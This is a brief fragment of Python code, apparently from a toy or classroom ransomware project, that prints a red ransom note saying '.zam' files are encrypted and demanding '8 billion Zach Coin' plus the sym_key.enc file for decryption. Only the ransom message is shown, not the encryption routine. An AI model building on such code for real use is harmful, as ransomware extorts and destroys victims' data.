...
''')
    ...
    print(f'''\033[91mYour .zam files have been encrypted''')
    print(f'''\033[91mTo decrypt your files please pay a sum of 8 billion Zach Coin''')
    print(f'''\033[91mWith your payment, send the sym_key.enc file and you will be provided with the decryption key and a python file that you must run to decrypt your files''')
